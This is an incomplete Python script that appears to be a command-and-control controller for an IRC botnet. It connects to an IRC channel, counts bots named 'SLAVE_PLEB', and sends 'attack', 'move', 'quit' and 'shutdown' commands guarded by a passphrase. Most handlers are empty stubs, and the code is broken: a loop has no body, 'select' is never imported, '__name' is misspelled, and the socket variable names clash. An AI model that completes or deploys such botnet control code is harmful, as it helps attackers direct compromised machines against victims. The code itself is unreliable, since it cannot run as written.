import time
import socket 
import sys 


HOST = None
PORT = None 
CHANNEL = None 
IRCSOCKET = None 

# CONTROLLER INFO
conNick = "CONTROLLER "
liveConnection = False # Flag to see if controller connection to IRC Server is active

# BOT INFO
botList = []
botSuccess = []
botFails = []

# PingPong protocol
def pingPong():
    pass 

# Get response from Bot 
def getResponse():
    try:
        # Get response from bot
        msg = ircSocket.recv(1024).decode('utf-8')
        return msg 
    except:
        return False

# COMMANDS

# Get bot status
def botStatus():
    # Get bot Nickname and how many there are
    # Append these bots to a list
    msg = getResponse()
    if msg != False:
        msg = msg.strip()
        msgLines = msg.split("\n")
        # Get bot names from split lines
        for x in msgLines:
            if x.startswith(":SLAVE_PLEB"):
                botName = x[x.find(":", 1) + 1:].strip()
                botList.append(botName)
        botNames = "\n".join(botList)
        print("Num of bots: " + str(len(botList)) + "\nBot Names:\n" + botNames)
        botList.clear()

# Tell bot to attack
def botAttack(host, port, channel):
    sendCommand("attack")
    # Get bot responses 
    msg = getResponse()
    if msg != False:
        try:
            msg = msg.strip()
            msgLines = msg.split("\n")
            for x in msgLines:
                # Get bot responses
        except:
            pass



# Tell bot to move channel
def botMove(host, port, channel):
    pass 

# Tell bot to quit
def botQuit():
    pass 

# Tell bot to shutdown
def botShutdown(): 
    pass

# SEND A PRIVATE MESSAGE/COMMAND TO BOTS
def sendCommand(msg):
    toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + conNick + " " + PHRASE + "\n"
    IRCSOCKET.send(toBot.encode())
    return

def botHandler():
    global liveConnection
    while liveConnection:
        # Gotta do the readable thing here
        readable, writable, exceptable = select.select([IRCSOCKET, sys.stdin],[sys.stdout],[])
        for x in readable:
            # Start parsing data 

            # If data starts with PONG, send PING 
            pingPong() 

            # elif data in command 
            # status, attack, move, quit, shutdown 


# CONNECT TO IRC SERVER CHANNEL
# This next line goes to a function
# ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def serverConnect(host, port):
    global IRCSOCKET, liveConnection 
    try:
        IRCSOCKET = connect((host,port))
        print("Connection successful")
        liveConnection = True 
        return True
    except:
        print("Connection failed")
        return False 



if __name == "__main__":
    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET

    # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong numnber of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    # Keep connection to IRC server 
    while True:
        connectStatus = serverConnect(HOST, PORT)
        if connectStatus == True:
            # Send initial PING? 
            pingPong()

            # Start giving commands to bot
            botHandler()
